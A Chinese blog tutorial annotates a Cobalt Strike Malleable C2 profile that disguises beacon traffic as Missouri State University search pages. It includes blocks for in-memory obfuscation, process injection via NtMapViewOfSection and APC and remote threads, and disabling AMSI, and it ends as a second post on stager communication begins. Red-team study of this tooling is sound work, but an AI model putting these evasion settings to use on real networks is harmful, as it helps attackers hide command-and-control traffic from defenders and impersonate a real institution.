&#x2F;&#x2F;配置请求的Uri路径</span><br><span class="line"></span><br><span class="line">    #set verb &quot;POST&quot;; &#x2F;&#x2F;用什么方法传输数据，不仅可以配置为get也可以配置为post</span><br><span class="line">    </span><br><span class="line">    client &#123;  &#x2F;&#x2F;client端的配置</span><br><span class="line"></span><br><span class="line">        header &quot;Host&quot; &quot;search.missouristate.edu&quot;;  </span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line"></span><br><span class="line">	   </span><br><span class="line">    metadata &#123; &#x2F;&#x2F;metadata是一段加密的数据，但是没有编码，所以他不能在请求头和URI中发送。需要使用base64、base64url或者netbios编码之后才能在请求头和URI中发送。</span><br><span class="line">        #base64</span><br><span class="line">        base64url;  &#x2F;&#x2F; 使用URL-safe Base64 进行编码</span><br><span class="line">        #mask;</span><br><span class="line">        #netbios;</span><br><span class="line">        #netbiosu;</span><br><span class="line">        #prepend &quot;TEST123&quot;;  &#x2F;&#x2F;开头插入字符串</span><br><span class="line">        #append &quot;.php&quot;; &#x2F;&#x2F;末尾追加字符串</span><br><span class="line"></span><br><span class="line">        parameter &quot;filter&quot;; &#x2F;&#x2F;把数据放到名为filter的uri参数中</span><br><span class="line">        #header &quot;Cookie&quot;; &#x2F;&#x2F;把数据放到名为Cookie的http头中</span><br><span class="line">        #uri-append; &#x2F;&#x2F;把数据直接追加到URI上</span><br><span class="line"></span><br><span class="line">        #print;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #parameter &quot;test1&quot; &quot;test2&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;  &#x2F;&#x2F;server端的请求配置</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;html; charset&#x3D;utf-8&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;User-Agent&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS&#x2F;8.5&quot;;</span><br><span class="line">        header &quot;BackendServer&quot; &quot;Handle&quot;;</span><br><span class="line">        header &quot;X-UA-Compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        header &quot;Set-Cookie&quot; &quot;WWW-SERVERID&#x3D;handle; path&#x3D;&#x2F;&quot;;</span><br><span class="line"> </span><br><span class="line">        output &#123;</span><br><span class="line"></span><br><span class="line">            netbios;</span><br><span class="line">            #netbiosu;</span><br><span class="line">            #base64;</span><br><span class="line">            #base64url;</span><br><span class="line">            #mask;</span><br><span class="line">  </span><br><span class="line">            prepend &quot;    &lt;link href&#x3D;\&quot;&#x2F;resource&#x2F;styles\&quot; media&#x3D;\&quot;all\&quot; rel&#x3D;\&quot;stylesheet\&quot; &#x2F;&gt;    &lt;script src&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;scripts&#x2F;2018&#x2F;common.js?_q&#x3D;&quot;;</span><br><span class="line">            prepend &quot;    &lt;meta name&#x3D;\&quot;robots\&quot; content&#x3D;\&quot;noindex\&quot; &#x2F;&gt;&lt;link rel&#x3D;\&quot;Stylesheet\&quot; media&#x3D;\&quot;all\&quot; href&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;styles&#x2F;msuwds&#x2F;main-sgf.css\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">            prepend &quot;    &lt;meta name&#x3D;\&quot;vireport\&quot; content&#x3D;\&quot;width&#x3D;device-width, initial-scale&#x3D;1.0\&quot; &#x2F;&gt;\n&quot;;   </span><br><span class="line">            prepend &quot;    &lt;title&gt;A - Site Index - Missouri State University&lt;&#x2F;title&gt;\n&quot;;</span><br><span class="line">            prepend &quot;    &lt;meta charset&#x3D;\&quot;UTF-8\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">            prepend &quot;&lt;head&gt;&quot;;     	       </span><br><span class="line">	    prepend &quot;&lt;html lang&#x3D;\&quot;en\&quot; itemscope itemtype&#x3D;\&quot;https:&#x2F;&#x2F;schema.org&#x2F;SearchResultsPage\&quot;&gt;\n&quot;;</span><br><span class="line">            prepend &quot;&lt;!DOCTYPE html&gt;\n&quot;;</span><br><span class="line"></span><br><span class="line">	    append &quot;\&quot;&gt;&lt;&#x2F;script&gt;\n&quot;;</span><br><span class="line">            append &quot;&lt;h2&gt;About search&lt;&#x2F;h2&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;ul&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;aboutwebsearch.htm\&quot;&gt;About web search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;]n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;aboutpeoplesearch.htm\&quot;&gt;About people search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;abouteventsearch.htm\&quot;&gt;About event search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;aboutmapsearch.htm\&quot;&gt;About map search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;&quot;;</span><br><span class="line">	    append &quot;&lt;&#x2F;ul&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;&#x2F;div&gt;&quot;;</span><br><span class="line"></span><br><span class="line">            print;  &#x2F;&#x2F;以print为结束</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        通过上面的HTTP-GET块的配置，我们配置了心跳包的请求URI为/siteindex/a/，并且设置了通过filter字段来传输信息，并且返回包的内容也和我们在server部分的配置相同。这里有一个点需要注意，就是在使用prepend在返回包中添加内容时，在多个prepend字段配置中,prepend字段添加的越早，显示时越在后面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">       prepend &quot;    &lt;link href&#x3D;\&quot;&#x2F;resource&#x2F;styles\&quot; media&#x3D;\&quot;all\&quot; rel&#x3D;\&quot;stylesheet\&quot; &#x2F;&gt;    &lt;script src&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;scripts&#x2F;2018&#x2F;common.js?_q&#x3D;&quot;;</span><br><span class="line">       prepend &quot;    &lt;meta name&#x3D;\&quot;robots\&quot; content&#x3D;\&quot;noindex\&quot; &#x2F;&gt;&lt;link rel&#x3D;\&quot;Stylesheet\&quot; media&#x3D;\&quot;all\&quot; href&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;styles&#x2F;msuwds&#x2F;main-sgf.css\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">       prepend &quot;    &lt;meta name&#x3D;\&quot;vireport\&quot; content&#x3D;\&quot;width&#x3D;device-width, initial-scale&#x3D;1.0\&quot; &#x2F;&gt;\n&quot;;   </span><br><span class="line">       prepend &quot;    &lt;title&gt;A - Site Index - Missouri State University&lt;&#x2F;title&gt;\n&quot;;</span><br><span class="line">       prepend &quot;    &lt;meta charset&#x3D;\&quot;UTF-8\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">       prepend &quot;&lt;head&gt;&quot;;     	       </span><br><span class="line">prepend &quot;&lt;html lang&#x3D;\&quot;en\&quot; itemscope itemtype&#x3D;\&quot;https:&#x2F;&#x2F;schema.org&#x2F;SearchResultsPage\&quot;&gt;\n&quot;;</span><br><span class="line">       prepend &quot;&lt;!DOCTYPE html&gt;\n&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902172951017.png" alt="image-20200902172951017"></p>
<p>​        我们再看一下当我们向client发送指令时的数据包,我们可以看到server端传递的请求在参数q中</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902180603819.png" alt="image-20200902180603819"></p>
<p>​        当客户端收到指令时，一般通过post来向服务端返回命令执行的结果，这部分可以通过http-post部分来配置，配置过程如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">###HTTP-Post Block###</span><br><span class="line">http-post &#123;</span><br><span class="line">    </span><br><span class="line">    set uri &quot;&#x2F;getsearchresults&quot;;  &#x2F;&#x2F;配置post请求的uri</span><br><span class="line">    #set verb &quot;GET&quot;;</span><br><span class="line">    set verb &quot;POST&quot;;  &#x2F;&#x2F;配置请求的形式</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">#	header &quot;Host&quot; &quot;search.missouristate.edu&quot;;    &#x2F;&#x2F;配置请求头的信息</span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;  </span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en-US&quot;;   </span><br><span class="line">        </span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;   &#x2F;&#x2F; URL-safe Base64 编码形式输出</span><br><span class="line">	    parameter &quot;site_indexFilter&quot;;  &#x2F;&#x2F;将数据放到site_indexFilter参数中进行传输</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        id &#123; &#x2F;&#x2F;通过id标识应该输出到哪个beacon</span><br><span class="line">	    base64url;   </span><br><span class="line">	    parameter &quot;peopleFilter&quot;;  &#x2F;&#x2F;将数据放到peopleFilter参数中进行传输</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    parameter &quot;eventsFilter&quot; &quot;campus:sgf&quot;;    &#x2F;&#x2F;配置一些其他的请求参数和参数值</span><br><span class="line">#    parameter &quot;mapFilter&quot; &quot;campus&quot;;</span><br><span class="line">    parameter &quot;query&quot; &quot;my%20missouri%20state&quot;;</span><br><span class="line">    parameter &quot;resultCounts&quot; &quot;5,3,3,3&amp;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;json; charset&#x3D;utf-8&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;User-Agent,AcceptEncoding&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS&#x2F;8.5&quot;;</span><br><span class="line">        header &quot;BackendServer&quot; &quot;Handle&quot;;</span><br><span class="line">        header &quot;X-UA-Compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;  &#x2F;&#x2F;通过netbios传输信息 </span><br><span class="line">	   </span><br><span class="line">	    prepend &quot;[\&quot;&#123;\\\&quot;results\\\&quot;:[\\\&quot;&#123;\\\\\\\&quot;ID\\\\\\\&quot;:\\\\\\\&quot;Missouri State University Foundation\\\\\\\&quot;,\\\\\\\&quot;Name\\\\\\\&quot;:\\\\\\\&quot;Missouri State University Foundation\\\\\\\&quot;,\\\\\\\&quot;Url\\\\\\\&quot;:\\\\\\\&quot;https:&#x2F;&#x2F;www.missouristatefoundation.org&#x2F;\\\\\\\&quot;,\\\\\\\&quot;Keywords\\\\\\\&quot;:&quot;;</span><br><span class="line"></span><br><span class="line">	    append &quot;\&quot;\\\\\\\&quot;development; endowment; foundation; Foundation, Missouri State; fundraising; missouri state foundation; missouri state university foundation\\\\\\\&quot;,\\\\\\\&quot;UnitType\\\\\\\&quot;:\\\\\\\&quot;Department\\\\\\\&quot;&#125;\\\&quot;,\\\&quot;&#123;\\\\\\\&quot;ID\\\\\\\&quot;:\\\\\\\&quot;Missouri State Outreach\\\\\\\&quot;,\\\\\\\&quot;Name\\\\\\\&quot;:\\\\\\\&quot;Missouri State Outreach\\\\\\\&quot;,\\\\\\\&quot;Url\\\\\\\&quot;:\\\\\\\&quot;https:&#x2F;&#x2F;outreach.missouristate.edu&#x2F;\\\\\\\&quot;,\\\\\\\&quot;Keywords\\\\\\\&quot;:\\\\\\\&quot;distance learning; dual credit; evening; extended campus; Extended Campus (now Missouri State Outreach); i courses; i-courses; icourses; interactive video; itv; non credit; non-credit; noncredit; off campus; off-campus; offcampus; online; outreach; Outreach, Missouri State\\\\\\\&quot;&#125;\&quot;]&quot;;</span><br><span class="line"></span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​         通过上面对于http-post的配置，我们可以看到通过post的方式请求getsearchresults这个uri,并且在请求中加入了site_indexFilter字段，这个字段用来传输命令执行的结果。通过peopleFilter这个字段来返回beacon client对应的id。并且加上了query和resultCounts这两个参数，不过这两个参数的内容都是写死的。最后在server部分我们配置了返回的内容。我们使用wireshark来看下请求的内容与我们的配置是否一致</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902180954689.png" alt="image-20200902180954689"></p>
<p>​        下面我们配置http-stager的信息，我们可以在下面的代码块中定义自己下载stage的行为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">###HTTP-Stager Block###</span><br><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">    set uri_x86 &quot;&#x2F;Events&quot;;  &#x2F;&#x2F;当下在x86的stage时，请求的uri</span><br><span class="line">    set uri_x64 &quot;&#x2F;events&quot;;  &#x2F;&#x2F;当下在x64的stage时，请求的uri</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;search.missouristate.com&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line"></span><br><span class="line">        #parameter &quot;test1&quot; &quot;test2&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;  &#x2F;&#x2F;配置server返回stage的格式</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;User-Agent&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS&#x2F;8.5&quot;;</span><br><span class="line">        header &quot;BackendServer&quot; &quot;Handle&quot;;</span><br><span class="line">        header &quot;X-UA-Compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        header &quot;Set-Cookie&quot; &quot;WWW-SERVERID&#x3D;handle; path&#x3D;&#x2F;&quot;;  </span><br><span class="line"></span><br><span class="line">        output &#123;  &#x2F;&#x2F;对输出的内容进行配置，这里并没有加上其他的处理</span><br><span class="line">        </span><br><span class="line">            #prepend &quot;content&#x3D;&quot;;  </span><br><span class="line"></span><br><span class="line">            #append &quot;&lt;&#x2F;script&gt;\n&quot;;</span><br><span class="line">            print;   </span><br><span class="line">        &#125;  </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        通过上面的HTTP-Stager的配置后,当stager去请求下载stage时，请求/Events这个uri，并且host的内容都和我们设置的在HTTP-Stager的client中配置的一致。再看看返回包中的内容，请求头中的内容也和我们配置的server部分一致。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902172033813.png" alt="image-20200902172033813"></p>
<p>​        再看看可扩展的pe和躲避杀软的模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">###Malleable PE&#x2F;Stage Block###</span><br><span class="line">stage &#123;</span><br><span class="line">    set checksum        &quot;0&quot;;  &#x2F;&#x2F;PE头里checksum的值</span><br><span class="line">    set compile_time    &quot;23 Nov 2018 02:25:37&quot;; &#x2F;&#x2F;beacon pe头中显示的编译的时间</span><br><span class="line">    set entry_point     &quot;170000&quot;; &#x2F;&#x2F;beacon pe头中设置的入口点</span><br><span class="line">    #set image_size_x86 &quot;6586368&quot;;  &#x2F;&#x2F;x86 PE头里写的镜像大小</span><br><span class="line">    #set image_size_x64 &quot;6586368&quot;;  &#x2F;&#x2F;x64 PE头里写的镜像大小</span><br><span class="line">    #set name	        &quot;WWanMM.dll&quot;;   &#x2F;&#x2F;	beacon dll 导出的名字</span><br><span class="line">    set userwx 	        &quot;false&quot;;    &#x2F;&#x2F;反射加载时是否要把内存设置为可读可写可执行</span><br><span class="line">    set cleanup	        &quot;true&quot;;  &#x2F;&#x2F;如果选择是则尝试释放反射加载的dll的内存</span><br><span class="line">    set sleep_mask	&quot;true&quot;;  &#x2F;&#x2F;是否在sleep前在内存中混淆beacon</span><br><span class="line">    set stomppe	        &quot;true&quot;; &#x2F;&#x2F;</span><br><span class="line">    set obfuscate	&quot;true&quot;;  &#x2F;&#x2F;是否混淆反射调用dll的导入表，覆盖无用的header内容，请求反射加载器copy beacon到新的内存没有dll头</span><br><span class="line">    set rich_header     &quot;&quot;;  &#x2F;&#x2F;编译器插入的元信息</span><br><span class="line">    </span><br><span class="line">    set sleep_mask &quot;true&quot;;  &#x2F;&#x2F;是否在sleep前在内存中混淆beacon</span><br><span class="line"></span><br><span class="line">    set module_x86 &quot;wwanmm.dll&quot;;  &#x2F;&#x2F;加载一个dll，然后用beacon去覆盖它分配的空间，而不是用VirtualAlloc去分配内存</span><br><span class="line">    set module_x64 &quot;wwanmm.dll&quot;;</span><br><span class="line"></span><br><span class="line">    transform-x86 &#123;</span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;  &#x2F;&#x2F; 在beacon 反射调用dll之前插入一些数据</span><br><span class="line">        strrep &quot;ReflectiveLoader&quot; &quot;&quot;; </span><br><span class="line">        strrep &quot;beacon.dll&quot; &quot;&quot;;   &#x2F;&#x2F;  查找并替换字符串</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;</span><br><span class="line">        strrep &quot;ReflectiveLoader&quot; &quot;&quot;;</span><br><span class="line">        strrep &quot;beacon.x64.dll&quot; &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    #string &quot;something&quot;;   &#x2F;&#x2F;添加字符串</span><br><span class="line">    #data &quot;something&quot;;</span><br><span class="line">    #stringw &quot;something&quot;;   &#x2F;&#x2F;添加UTF-16字符串</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        在看看进程注入的部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">###Process Inject Block###</span><br><span class="line">process-inject &#123;</span><br><span class="line"></span><br><span class="line">    set allocator &quot;NtMapViewOfSection&quot;;	&#x2F;&#x2F;在远程进程中分配内存的方式，有两种方式VirtualAllocEx和NtMapViewOfSection，VirtualAlloc是Windows提供的API，通常用来分配大块的内存。例如如果想在进程A和进程B之间通过共享内存的方式实现通信，可以使用该函数（这也是较常用的情况）。利用NtMapViewOfSection在远程进程地址空间写入代码，并且用一种新的技术在远程进程中执行它，这种技术完全工作在用户模式下，并且不需要特殊的条件比如像管理员权限或者之类的要求</span><br><span class="line">    set min_alloc &quot;16700&quot;;  &#x2F;&#x2F;最小的分配内存的大小</span><br><span class="line"></span><br><span class="line">    set userwx &quot;false&quot;;  &#x2F;&#x2F;&#x2F;&#x2F;是否使用rwx作为代码内存的默认权限，默认rx</span><br><span class="line">    </span><br><span class="line">    set startrwx &quot;false&quot;;  &#x2F;&#x2F;是否使用rwx作为代码内存的默认权限,默认rx</span><br><span class="line">        </span><br><span class="line">    transform-x86 &#123;  </span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execute &#123;</span><br><span class="line">        CreateThread &quot;ntdll!RtlUserThreadStart&quot;;    &#x2F;&#x2F;进程可以在其他的进程中创建一个线程 </span><br><span class="line">        CreateThread; </span><br><span class="line">        NtQueueApcThread;  &#x2F;&#x2F;通过NtQueueApcThread实现APC注入</span><br><span class="line">        CreateRemoteThread;</span><br><span class="line">        RtlCreateUserThread;  &#x2F;&#x2F;创建远程线程的一种技术</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        我们再来看看post-ex块，这个模块用来控制后渗透的行为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">###Post-Ex Block###</span><br><span class="line">post-ex &#123;</span><br><span class="line"></span><br><span class="line">    set spawnto_x86 &quot;%windir%\\syswow64\\gpupdate.exe&quot;;  &#x2F;&#x2F;派生后渗透功能的默认临时进程</span><br><span class="line">    set spawnto_x64 &quot;%windir%\\sysnative\\gpupdate.exe&quot;;</span><br><span class="line"></span><br><span class="line">    set obfuscate &quot;true&quot;;  &#x2F;&#x2F;对dll的内容进行加密，并且将post-ex功能建立到内存中，</span><br><span class="line"></span><br><span class="line">    set smartinject &quot;true&quot;; &#x2F;&#x2F;提示beacon将关键的函数指针嵌入到相同架构的post-ex dll中</span><br><span class="line"> </span><br><span class="line">    set amsi_disable &quot;true&quot;;  &#x2F;&#x2F;关闭amsi,AMSI（Antimalware Scan Interface）， 即反恶意软件扫描接口。在Windows Server 2016和Win10上默认安装并启用。</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​            通过上面的学习，大家应该了解了关于Malleable C2 Profile文件编写的基本的方法，可以根据自己的需要编写自己的Malleable C2 Profile文件，当然我们得知道编写profile文件的目的是为了尽量去模拟正常的网站访问流量。</p>
<p><strong>参考文章</strong></p>
<p><a href="https://medium.com/bugbountywriteup/red-team-cobalt-strike-4-0-malleable-c2-profile-guideline-eb3eeb219a7c" target="_blank" rel="noopener">[RED_TEAM] Cobalt Strike 4.0+ Malleable C2 Profile Guideline</a></p>
<p>CobaltStrike4.0用户手册_中文翻译</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">关于cobaltstrike通信流程的分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-09-01 16:15:43" itemprop="dateCreated datePublished" datetime="2020-09-01T16:15:43+08:00">2020-09-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-09-02 20:03:18" itemprop="dateModified" datetime="2020-09-02T20:03:18+08:00">2020-09-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
                    <span itemprop="name">cobaltstrike</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        之前我们了解了关于cobaltstrike shell生成的过程，接下来我们一起了解一下cobaltstrike的stager具体是如何工作的，它在目标主机执行后是如何和我们的服务端进行通信的。</p>
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>​        在我们分析cobaltstrike的通信过程之前，首先需要了解cobaltstrike的一些基本概念</p>
<p><strong>Staged Payloads</strong></p>
